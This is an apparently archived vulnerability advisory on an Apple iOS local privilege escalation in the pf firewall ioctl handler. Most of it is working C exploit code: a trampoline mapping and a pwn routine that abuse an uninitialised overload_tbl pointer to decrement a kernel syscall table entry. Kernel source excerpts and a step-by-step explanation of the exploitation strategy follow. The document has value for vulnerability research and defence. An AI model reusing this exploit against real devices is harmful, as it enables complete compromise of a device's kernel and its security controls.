source: http://www.securityfocus.com/bid/45010/info

Apple iOS is prone to a local privilege-escalation vulnerability.

Local attackers running malicious code can exploit this issue to elevate their privileges. Successful attacks will completely compromise an affected device. 

int main() {
    unsigned int target_addr = CONFIG_TARGET_ADDR;
    unsigned int target_addr_real = target_addr & ~1;
    unsigned int target_pagebase = target_addr & ~0xfff;
    unsigned int num_decs = (CONFIG_SYSENT_PATCH_ORIG - target_addr) >> 24;
    assert(MAP_FAILED != mmap((void *) target_pagebase, 0x2000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0));
    unsigned short *p = (void *) target_addr_real;
    if(target_addr_real & 2) *p++ = 0x46c0; // nop
    *p++ = 0x4b00; // ldr r3, [pc]
    *p++ = 0x4718; // bx r3
    *((unsigned int *) p) = (unsigned int) &ok_go;
    assert(!mprotect((void *)target_pagebase, 0x2000, PROT_READ | PROT_EXEC));
    
    // Yes, reopening is necessary
    pffd = open("/dev/pf", O_RDWR);
    ioctl(pffd, DIOCSTOP);
    assert(!ioctl(pffd, DIOCSTART));
    unsigned int sysent_patch = CONFIG_SYSENT_PATCH;
    while(num_decs--)
        pwn(sysent_patch+3);
    assert(!ioctl(pffd, DIOCSTOP));
    close(pffd);
    
    assert(!mlock((void *) ((unsigned int)(&ok_go) & ~0xfff), 0x1000));
    assert(!mlock((void *) ((unsigned int)(&flush) & ~0xfff), 0x1000));
    assert(!mlock((void *) target_pagebase, 0x2000));
#ifdef DEBUG
    printf("ok\n"); fflush(stdout);
#endif
    syscall(0);
#ifdef DEBUG
    printf("we're out\n"); fflush(stdout);
#endif
    //...
}
//...

static void pwn(unsigned int addr) {
    struct pfioc_trans trans;
    struct pfioc_trans_e trans_e;
    struct pfioc_pooladdr pp;
    struct pfioc_rule pr;

    memset(&trans, 0, sizeof(trans));
    memset(&trans_e, 0, sizeof(trans_e));
    memset(&pr, 0, sizeof(pr));

    trans.size = 1;
    trans.esize = sizeof(trans_e);
    trans.array = &trans_e;
    trans_e.rs_num = PF_RULESET_FILTER;
    memset(trans_e.anchor, 0, MAXPATHLEN);
    assert(!ioctl(pffd, DIOCXBEGIN, &trans)); 
    u_int32_t ticket = trans_e.ticket;

    assert(!ioctl(pffd, DIOCBEGINADDRS, &pp));
    u_int32_t pool_ticket = pp.ticket;

    pr.action = PF_PASS;
    pr.nr = 0;
    pr.ticket = ticket;
    pr.pool_ticket = pool_ticket;
    memset(pr.anchor, 0, MAXPATHLEN);
    memset(pr.anchor_call, 0, MAXPATHLEN);

    pr.rule.return_icmp = 0;
    pr.rule.action = PF_PASS;
    pr.rule.af = AF_INET;
    pr.rule.proto = IPPROTO_TCP;
    pr.rule.rt = 0;
    pr.rule.rpool.proxy_port[0] = htons(1);
    pr.rule.rpool.proxy_port[1] = htons(1);

    pr.rule.src.addr.type = PF_ADDR_ADDRMASK;
    pr.rule.dst.addr.type = PF_ADDR_ADDRMASK;
    
    //offsetof(struct pfr_ktable, pfrkt_refcnt[PFR_REFCNT_RULE]) = 0x4a4
    pr.rule.overload_tbl = (void *)(addr - 0x4a4);
    
    errno = 0;

    assert(!ioctl(pffd, DIOCADDRULE, &pr));

    assert(!ioctl(pffd, DIOCXCOMMIT, &trans));

    pr.action = PF_CHANGE_REMOVE;
    assert(!ioctl(pffd, DIOCCHANGERULE, &pr));
}

########################################################################################################
The vulnerability is located in the DIOCADDRULE ioctl handler, due to improper initialization of the overload_tbl field, which can be later exploited in the DIOCCHANGERULE handler. The following code snippet shows the relevant parts of those handlers :
########################################################################################################

//bsd/net/pf_ioctl.c
static int
pfioctl(dev_t dev, u_long cmd, caddr_t addr, int flags, struct proc *p)
{
    //...
    switch (cmd) {
    //...
    case DIOCADDRULE: {
        struct pfioc_rule    *pr = (struct pfioc_rule *)addr;
        struct pf_ruleset    *ruleset;
        
        //...
        
        //copy structure passed from userspace
        bcopy(&pr->rule, rule, sizeof (struct pf_rule));
        rule->cuid = kauth_cred_getuid(p->p_ucred);
        rule->cpid = p->p_pid;
        rule->anchor = NULL;
        rule->kif = NULL;
        TAILQ_INIT(&rule->rpool.list);
        /* initialize refcounting */
        rule->states = 0;
        rule->src_nodes = 0;
        rule->entries.tqe_prev = NULL;
        
        //...
        
        if (rule->overload_tblname[0]) {
            if ((rule->overload_tbl = pfr_attach_table(ruleset,
                rule->overload_tblname)) == NULL)
                error = EINVAL;
            else
                rule->overload_tbl->pfrkt_flags |=
                    PFR_TFLAG_ACTIVE;
        }
        //...

    case DIOCCHANGERULE: {
        //...
        if (pcr->action == PF_CHANGE_REMOVE) {
            pf_rm_rule(ruleset->rules[rs_num].active.ptr, oldrule);
            ruleset->rules[rs_num].active.rcount--;
        }
        //...
    }

    //...
}
################################################################################################ 
The rule field of the pfioc_rule structure passed from userland is copied into a kernel buffer, and then some of the structure fields are reinitialized. However, if rule->overload_tblname[0] is zero, the rule->overload_tbl pointer won't be initialized properly and will retain the value passed from userland. When the rule is removed, the pf_rm_rule function calls pfr_detach_table which in turn decrements a reference counter using the invalid pointer, allowing an arbitrary decrement anywhere in kernel memory :
##############################################################################################
//bsd/net/pf_ioctl.c
void
pf_rm_rule(struct pf_rulequeue *rulequeue, struct pf_rule *rule)
{
    if (rulequeue != NULL) {
        if (rule->states <= 0) {
            /*
             * XXX - we need to remove the table *before* detaching
             * the rule to make sure the table code does not delete
             * the anchor under our feet.
             */
            pf_tbladdr_remove(&rule->src.addr);
            pf_tbladdr_remove(&rule->dst.addr);
            if (rule->overload_tbl)
                pfr_detach_table(rule->overload_tbl);
        }
    //...
}


//bsd/net/pf_table.c
void
pfr_detach_table(struct pfr_ktable *kt)
{
    lck_mtx_assert(pf_lock, LCK_MTX_ASSERT_OWNED);

    if (kt->pfrkt_refcnt[PFR_REFCNT_RULE] <= 0)
        printf("pfr_detach_table: refcount = %d.\n",
            kt->pfrkt_refcnt[PFR_REFCNT_RULE]);
    else if (!--kt->pfrkt_refcnt[PFR_REFCNT_RULE]) //arbitrary decrement happens here
        pfr_setflags_ktable(kt, kt->pfrkt_flags&~PFR_TFLAG_REFERENCED);
}

###############################################################################################
In order to decrement the dword at address addr, the pwn function of comex's exploit sets the pr.rule.overload_tbl to addr minus 0x4a4, which is the value of offsetof(struct pfr_ktable, pfrkt_refcnt[PFR_REFCNT_RULE]) on a 32 bit architecture. The exploit decrement the syscall 0 handler address in the sysent array which holds function pointers for all system calls. A trampoline shellcode is mapped at a specific address chosen so that only the most significant byte of the original pointer has to be decremented (the minimum amount to move the pointer from kernel space down to user space). This trampoline will simply call the ok_go C function which will patch various functions in the kernel to perform the jailbreak : make code signing checks return true, disable W^X policy, and restore the overwritten syscall handler.